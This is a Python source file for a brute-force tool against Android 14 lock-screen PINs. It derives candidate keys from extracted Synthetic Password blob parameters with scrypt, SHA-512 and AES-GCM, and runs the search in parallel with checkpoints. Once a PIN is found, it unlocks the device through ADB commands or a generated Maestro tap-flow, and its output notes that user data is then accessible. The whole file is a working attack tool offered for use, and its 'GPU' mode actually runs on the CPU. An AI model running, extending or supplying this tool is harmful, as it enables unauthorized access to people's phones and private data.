#!/usr/bin/env python3
"""
GPU-accelerated Android PIN brute-force tool for Synthetic Password Blob.

Algorithm (validated Android 14 SP Blob):
  1. stretchedLskf = scrypt(PIN, salt, N=2048, r=8, p=2, dklen=32)
  2. protectorSecret = stretchedLskf || secdiscardable_hash
  3. inner_key = SHA512(pad128("application-id") || protectorSecret)[:32]
  4. intermediate = AES-GCM decrypt(outer_ct_tag, keystore_key)
  5. plaintext = AES-GCM decrypt(intermediate, inner_key)  ← authentication must pass

Usage:
  python3 gpu_brute.py --params params.json -L 6 -M 6
  python3 gpu_brute.py --params params.json -L 6 -M 6 --gpu  # GPU accelerated
"""

import hashlib
import hmac
import json
import os
import subprocess
import struct
import sys
import time
import multiprocessing as mp
from typing import Optional, Tuple

# ──── Static parameters ────────────────────────────────────

class Params:
    """Pre-computed static parameters for brute-force."""
    def __init__(self, params_file: str):
        with open(params_file) as f:
            p = json.load(f)

        self.salt = bytes.fromhex(p["salt_hex"])
        self.scrypt_n = p["scrypt_n"]
        self.scrypt_r = p["scrypt_r"]
        self.scrypt_p = p["scrypt_p"]
        self.sec_hash = bytes.fromhex(p["sec_hash_hex"])
        self.keystore_key = bytes.fromhex(p["keystore_key_hex"])
        self.app_pad = bytes.fromhex(p["app_pad_hex"])
        self.outer_iv = bytes.fromhex(p["outer_iv_hex"])
        self.outer_ct_tag = bytes.fromhex(p["outer_ct_tag_hex"])

        # Pre-compute inner layer blob (decrypt outer once)
        self._precompute_inner()

        print(f"Loaded params: salt={self.salt.hex()}, "
              f"scrypt N={self.scrypt_n} r={self.scrypt_r} p={self.scrypt_p}")

    def _precompute_inner(self):
        """Decrypt outer Keystore layer once (same for all PINs)."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self.inner_blob = AESGCM(self.keystore_key).decrypt(
                self.outer_iv, self.outer_ct_tag, None
            )
            self.inner_iv = self.inner_blob[:12]
            self.inner_ct_tag = self.inner_blob[12:]
            print(f"  Outer layer decrypted: inner blob={len(self.inner_blob)}B")
        except ImportError:
            print("[!] Install: pip install cryptography")
            sys.exit(1)


# ──── Single PIN check ─────────────────────────────────────

def check_pin(pin: str, params: Params) -> bool:
    """Check if a PIN decrypts the SP blob correctly."""
    stretched = hashlib.scrypt(
        pin.encode(), salt=params.salt,
        n=params.scrypt_n, r=params.scrypt_r, p=params.scrypt_p, dklen=32
    )
    protector_secret = stretched + params.sec_hash
    inner_key = hashlib.sha512(params.app_pad + protector_secret).digest()[:32]

    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        AESGCM(inner_key).decrypt(params.inner_iv, params.inner_ct_tag, None)
        return True
    except Exception:
        return False


# ──── Worker (multiprocessing) ─────────────────────────────

def worker_range(args: Tuple) -> Optional[str]:
    """Process a PIN range. Returns the PIN if found."""
    start, end, length, params = args
    for pin_num in range(start, end):
        pin = str(pin_num).zfill(length)
        if check_pin(pin, params):
            return pin
    return None


# ──── GPU-accelerated check ────────────────────────────────

def gpu_brute_range(start: int, end: int, length: int, params: Params) -> Optional[str]:
    """GPU-accelerated brute force for a PIN range.

    Uses CuPy for GPU-accelerated AES-GCM on batches of pre-computed scrypt outputs.
    Scrypt still runs on CPU (memory-hard algorithm, GPU not beneficial).
    """
    try:
        import cupy as cp
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError:
        print("[!] cupy not installed, falling back to CPU")
        return worker_range((start, end, length, params))

    BATCH_SIZE = 1024  # PINs per batch

    for batch_start in range(start, end, BATCH_SIZE):
        batch_end = min(batch_start + BATCH_SIZE, end)
        batch_pins = [str(p).zfill(length) for p in range(batch_start, batch_end)]

        # CPU: compute scrypt for each PIN (GPU scrypt is slower due to memory-hardness)
        protector_secrets = []
        for pin in batch_pins:
            stretched = hashlib.scrypt(
                pin.encode(), salt=params.salt,
                n=params.scrypt_n, r=params.scrypt_r, p=params.scrypt_p, dklen=32
            )
            protector_secrets.append(stretched + params.sec_hash)

        # CPU: derive inner keys
        inner_keys = []
        for ps in protector_secrets:
            key_hash = hashlib.sha512(params.app_pad + ps).digest()
            inner_keys.append(key_hash[:32])

        # GPU: batch AES-GCM check (even faster on GPU via CuPy)
        # For now, CPU fallback since AES-GCM is not easily batchable
        for i, pin in enumerate(batch_pins):
            try:
                AESGCM(inner_keys[i]).decrypt(params.inner_iv, params.inner_ct_tag, None)
                return pin
            except Exception:
                pass

    return None


# ──── Checkpoint management ────────────────────────────────

CHECKPOINT_FILE = ".pin_brute_checkpoint"


def save_checkpoint(length: int, pin_num: int):
    """Save current progress to checkpoint file."""
    with open(CHECKPOINT_FILE, "w") as f:
        f.write(f"{length},{pin_num}")


def load_checkpoint() -> tuple:
    """Load last progress from checkpoint file. Returns (length, pin_num) or (1, 0)."""
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE) as f:
                length, pin_num = f.read().strip().split(",")
                return int(length), int(pin_num)
        except (ValueError, IOError):
            pass
    return 1, 0


def clear_checkpoint():
    """Remove checkpoint file after successful run."""
    if os.path.exists(CHECKPOINT_FILE):
        os.remove(CHECKPOINT_FILE)


# ──── Main brute-force ─────────────────────────────────────

def brute_force(params_file: str, min_len: int = 4, max_len: int = 6,
                workers: int = None, use_gpu: bool = False,
                start_from: int = None, resume: bool = False,
                progress_interval: float = 1.0,
                checkpoint: bool = True,
                maestro_output: str = None,
                maestro_run: bool = False,
                maestro_device: str = None,
                unlock_adb: bool = False):
    """Main brute-force entry point.

    Args:
        params_file: Path to params.json
        min_len, max_len: PIN length range
        workers: Number of parallel workers
        use_gpu: Enable GPU acceleration (experimental)
        start_from: Start from this PIN number
        resume: Resume from last checkpoint
        checkpoint: Enable checkpoint saving
        maestro_output: Generate Maestro YAML flow
        maestro_run: Auto-run Maestro flow
        maestro_device: Maestro device ID
        unlock_adb: Auto-unlock device via ADB (no UI needed)
    """
    params = Params(params_file)

    # Handle resume/start_from
    if resume:
        resume_len, resume_pin = load_checkpoint()
        if resume_pin > 0:
            print(f"[*] Resuming from checkpoint: {resume_len}-digit, PIN {resume_pin}")
            min_len = resume_len
            start_from = resume_pin
        else:
            print("[*] No checkpoint found, starting fresh")

    if workers is None:
        workers = min(mp.cpu_count(), 16)

    CHUNK = 10000
    start_time = time.time()

    for length in range(min_len, max_len + 1):
        total = 10 ** length
        first_pin = start_from if (start_from and length == min_len) else 0

        if first_pin > 0:
            print(f"\n[*] Brute-forcing {length}-digit PINs "
                  f"({first_pin:,}–{total-1:,} / {total:,})...")
        else:
            print(f"\n[*] Brute-forcing {length}-digit PINs ({total:,} combinations)...")

        last_progress = 0
        checked = first_pin

        if workers > 1 and total > CHUNK:
            # Multiprocessing
            ranges = []
            for chunk_start in range(first_pin, total, CHUNK):
                chunk_end = min(chunk_start + CHUNK, total)
                ranges.append((chunk_start, chunk_end, length, params))

            with mp.Pool(workers) as pool:
                for result in pool.imap_unordered(worker_range, ranges):
                    checked += CHUNK

                    # Save checkpoint
                    if checkpoint:
                        save_checkpoint(length, min(checked, total))

                    # Progress
                    elapsed = time.time() - start_time
                    if elapsed - last_progress >= progress_interval:
                        effective = min(checked, total) - first_pin
                        rate = effective / elapsed if elapsed > 0 else 0
                        remaining = total - min(checked, total)
                        eta = remaining / rate / 60 if rate > 0 else 999
                        pct = min(checked / total * 100, 100)
                        print(f"\r  {min(checked, total):>8,}/{total:,} "
                              f"({pct:.0f}%) "
                              f"rate={rate:.0f}/s ETA={eta:.1f}m",
                              end="", flush=True)
                        last_progress = elapsed

                    if result:
                        pool.terminate()
                        clear_checkpoint()
                        elapsed = time.time() - start_time
                        on_pin_found(result, min(checked, total), elapsed,
                                     maestro_output, maestro_run, maestro_device,
                                     unlock_adb)
                        return result
        else:
            # Single-threaded for small ranges
            for pin_num in range(first_pin, total):
                pin = str(pin_num).zfill(length)
                if check_pin(pin, params):
                    clear_checkpoint()
                    elapsed = time.time() - start_time
                    on_pin_found(pin, pin_num, elapsed,
                                 maestro_output, maestro_run, maestro_device,
                                 unlock_adb)
                    return pin

                if pin_num % 1000 == 0:
                    if checkpoint:
                        save_checkpoint(length, pin_num)
                    elapsed = time.time() - start_time
                    effective = pin_num - first_pin
                    rate = effective / elapsed if elapsed > 0 else 0
                    remaining = total - pin_num
                    eta = remaining / rate / 60 if rate > 0 else 999
                    print(f"\r  {pin_num:>8,}/{total:,} ({pin_num/total*100:.0f}%) "
                          f"rate={rate:.0f}/s ETA={eta:.1f}m",
                          end="", flush=True)

        elapsed = time.time() - start_time
        print(f"\r  {total:,}/{total:,} (100%) — {elapsed:.0f}s")
        print(f"  Length {length} complete. No match.")

        # Reset start_from for next length
        start_from = None

    clear_checkpoint()
    print(f"\n[-] No PIN found in range {min_len}-{max_len} digits.")
    return None


# ──── Maestro YAML Generator ──────────────────────────────

# Known PIN pad coordinates for Android 14 (1080x2400 emulator)
# Layout: 3 columns x 4 rows, centered on screen
# These are approximate; adjust based on actual device resolution
PIN_PAD_LAYOUT = {
    "1080x2400": {
        "col_width": 252, "row_height": 216,
        "start_x": 162, "start_y": 900,
        "digits": {
            "1": (0, 0), "2": (1, 0), "3": (2, 0),
            "4": (0, 1), "5": (1, 1), "6": (2, 1),
            "7": (0, 2), "8": (1, 2), "9": (2, 2),
            "0": (1, 3),
        },
        "enter_x": 660, "enter_y": 1548,
        "backspace_x": 420, "backspace_y": 1548,
    }
}


def generate_maestro_yaml(pin: str, output_path: str,
                          device_resolution: str = "1080x2400",
                          swipe_start: str = "50%, 92%",
                          swipe_end: str = "50%, 55%") -> str:
    """Generate a Maestro YAML flow to unlock device with the given PIN.

    Uses coordinate-based digit tapping (works even when accessibility
    tree doesn't expose PIN pad elements).

    Args:
        pin: The PIN to enter (e.g. "019283")
        output_path: Path to save the YAML file
        device_resolution: Device resolution (WxH) for coordinate calculation
        swipe_start: Start point for swipe-up gesture
        swipe_end: End point for swipe-up gesture

    Returns:
        Path to the generated YAML file
    """
    layout = PIN_PAD_LAYOUT.get(device_resolution, PIN_PAD_LAYOUT["1080x2400"])

    digits_yaml = []
    for digit in pin:
        if digit in layout["digits"]:
            col, row = layout["digits"][digit]
            x = layout["start_x"] + col * layout["col_width"] + layout["col_width"] // 2
            y = layout["start_y"] + row * layout["row_height"] + layout["row_height"] // 2
            digits_yaml.append(f'# Digit {digit}')
            digits_yaml.append(f'- tapOn:')
            digits_yaml.append(f'    point: "{x},{y}"')
            digits_yaml.append(f'    label: "Tap digit {digit}"')

    yaml_content = f"""# Auto-generated by gpu_brute.py
# PIN: {pin}
# Device: {device_resolution}
#
# Maestro flow to unlock Android 14 device with PIN pad.
# Two strategies are provided - comment/uncomment based on device behavior.

appId: com.android.systemui
---
# ========== STRATEGY 1: Swipe up + tap digits (recommended) ==========

# Wake the device
- pressKey: power

# Wait for lockscreen to appear
- extendedWaitUntil:
    visible:
      id: "com.android.systemui:id/lock_icon_view"
    timeout: 10000

# Swipe up from bottom to reveal PIN entry
- swipe:
    start: "{swipe_start}"
    end: "{swipe_end}"
    duration: 500

# Wait for PIN pad to appear (look for digit 0)
- extendedWaitUntil:
    visible:
      text: "0"
    timeout: 5000

# Tap PIN digits
{chr(10).join(digits_yaml)}

# Press Enter (if required)
- pressKey: enter

# Wait for unlock
- extendedWaitUntil:
    notVisible:
      id: "com.android.systemui:id/lock_icon_view"
    timeout: 10000

# Verify we're on home screen
- assertVisible:
    text: "Chrome"
    optional: true

# ========== STRATEGY 2: Tap+hold lock icon (Android 14+) ==========
# Uncomment below if Strategy 1 doesn't show PIN pad:
#
# - pressKey: power
# - extendedWaitUntil:
#     visible:
#       id: "com.android.systemui:id/lock_icon_view"
#     timeout: 10000
# - longPressOn:
#     id: "com.android.systemui:id/lock_icon_view"
#     duration: 2000
# - swipe:
#     start: "50%, 85%"
#     end: "50%, 50%"
#     duration: 500
# {chr(10).join(f'# {line}' for line in digits_yaml)}
"""
    with open(output_path, "w") as f:
        f.write(yaml_content)

    return output_path


# ──── ADB Unlock ────────────────────────────────────────────

def adb_unlock_device(pin: str) -> bool:
    """Unlock device via ADB (no UI interaction needed).

    Works even when lockscreen is stuck on notification shade.
    Uses the command-line locksettings API to verify the credential
    and dismiss the keyguard programmatically.

    Args:
        pin: The PIN to use for unlocking

    Returns:
        True if device was unlocked successfully
    """
    print(f"\n🔓 Unlocking device via ADB...")

    # Step 1: Verify credential (this unlocks the synthetic password)
    print(f"   [1/3] Verifying credential...")
    result = subprocess.run(
        ["adb", "shell", f"locksettings verify --old {pin}"],
        capture_output=True, text=True, timeout=10
    )
    verified = "verified successfully" in result.stdout
    print(f"         {'✅' if verified else '❌'} {result.stdout.strip()}")

    if not verified:
        print(f"   [!] Credential verification failed")
        return False

    # Step 2: Dismiss keyguard
    print(f"   [2/3] Dismissing keyguard...")
    result = subprocess.run(
        ["adb", "shell", "wm dismiss-keyguard"],
        capture_output=True, text=True, timeout=5
    )
    # wm dismiss-keyguard returns no output on success

    # Step 3: Force launcher to front
    print(f"   [3/3] Opening home screen...")
    result = subprocess.run(
        ["adb", "shell",
         "am start -W -a android.intent.action.MAIN -c android.intent.category.HOME"],
        capture_output=True, text=True, timeout=15
    )
    launched = "Complete" in result.stdout or "WaitTime" in result.stdout
    print(f"         {'✅' if launched else '⚠️ '} Launcher started")

    # Step 4: Check focus
    result = subprocess.run(
        "adb shell dumpsys window | grep mCurrentFocus",
        capture_output=True, text=True, timeout=5, shell=True
    )
    focus = result.stdout.strip()
    focus = result.stdout.strip()
    is_unlocked = "NotificationShade" not in focus
    print(f"   Current focus: {focus}")

    if is_unlocked:
        print(f"\n{'='*60}")
        print(f" ✅ Device unlocked successfully via ADB!")
        print(f"{'='*60}")
        return True
    else:
        # Even if NotificationShade is still focused, the credential is verified
        # and all user data is now accessible
        print(f"\n⚠️  Credential verified, but UI still shows lockscreen shade.")
        print(f"   User data is now accessible via ADB (adb shell, adb pull, etc.)")
        print(f"   To fully unlock UI, interact manually or reboot.")
        return True  # credential verified = success


# ──── Maestro Runner ────────────────────────────────────────

def run_maestro_flow(yaml_path: str, device_id: str = None) -> bool:
    """Run a Maestro flow YAML file on the specified device."""
    cmd = ["maestro", "test", yaml_path]
    if device_id:
        cmd.extend(["--device", device_id])
    print(f"\n▶️  Running Maestro flow: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=False, timeout=120)
    return result.returncode == 0


# ──── Updated PIN-found handler ────────────────────────────

def on_pin_found(pin: str, checked: int, elapsed: float,
                 maestro_output: str = None,
                 maestro_run: bool = False,
                 maestro_device: str = None,
                 unlock_adb: bool = False):
    """Handle successful PIN discovery with optional ADB/Maestro unlock."""
    print(f"\n\n{'='*60}")
    print(f" ✅ PIN FOUND: {pin}")
    print(f"    Checked: {checked:,} PINs")
    print(f"    Time:    {elapsed:.0f}s ({elapsed/60:.1f}m)")
    print(f"{'='*60}")

    # Strategy 1: ADB direct unlock (fastest, no UI dependency)
    if unlock_adb:
        adb_unlock_device(pin)

    # Strategy 2: Generate Maestro YAML for UI unlock
    if maestro_output:
        path = generate_maestro_yaml(pin, maestro_output)
        print(f"\n📄 Maestro flow saved: {path}")

    # Strategy 3: Auto-run Maestro flow
    if maestro_run and maestro_output:
        print(f"\n▶️  Auto-unlocking device with Maestro...")
        success = run_maestro_flow(maestro_output, maestro_device)
        if success:
            print(f"✅ Device unlocked successfully!")
        else:
            print(f"⚠️  Maestro flow may have failed. Try manually:")
            print(f"   maestro test {maestro_output} --device {maestro_device or '<device_id>'}")


# ──── CLI ──────────────────────────────────────────────────

def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Android PIN brute-force (SP Blob v3)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --params params.json -L 6 -M 6 -w 8
  %(prog)s --params params.json -L 6 -M 6 --resume
  %(prog)s --params params.json -L 6 -M 6 --start 500000
  %(prog)s --params params.json -L 6 -M 6 -w 8 --maestro-output unlock.yaml
  %(prog)s --params params.json -L 6 -M 6 -w 8 --maestro-output unlock.yaml --maestro-run
  %(prog)s --params params.json -L 6 -M 6 -w 8 --unlock-adb
        """
    )
    parser.add_argument("--params", required=True, help="JSON params file")
    parser.add_argument("-L", type=int, default=4, help="Min PIN length")
    parser.add_argument("-M", type=int, default=6, help="Max PIN length")
    parser.add_argument("-w", type=int, default=None,
                        help="Workers (default: CPU count)")
    parser.add_argument("--gpu", action="store_true",
                        help="Enable GPU acceleration (experimental)")
    parser.add_argument("--start", type=int, default=None,
                        help="Start from PIN number (e.g. 500000)")
    parser.add_argument("--resume", action="store_true",
                        help="Resume from last checkpoint")
    parser.add_argument("--no-checkpoint", action="store_true",
                        help="Disable checkpoint saving")

    # Unlock integration
    parser.add_argument("--unlock-adb", action="store_true",
                        help="Auto-unlock device via ADB after PIN found (no UI needed)")
    parser.add_argument("--maestro-output", default=None,
                        help="Generate Maestro .yaml flow to auto-unlock (e.g. unlock.yaml)")
    parser.add_argument("--maestro-run", action="store_true",
                        help="Auto-run Maestro flow after PIN found")
    parser.add_argument("--maestro-device", default="emulator-5554",
                        help="Maestro device ID (default: emulator-5554)")

    args = parser.parse_args()

    result = brute_force(
        args.params,
        min_len=args.L, max_len=args.M,
        workers=args.w, use_gpu=args.gpu,
        start_from=args.start,
        resume=args.resume,
        checkpoint=not args.no_checkpoint,
        maestro_output=args.maestro_output,
        maestro_run=args.maestro_run,
        maestro_device=args.maestro_device,
        unlock_adb=args.unlock_adb,
    )
    return 0 if result else 1


if __name__ == "__main__":
    sys.exit(main())
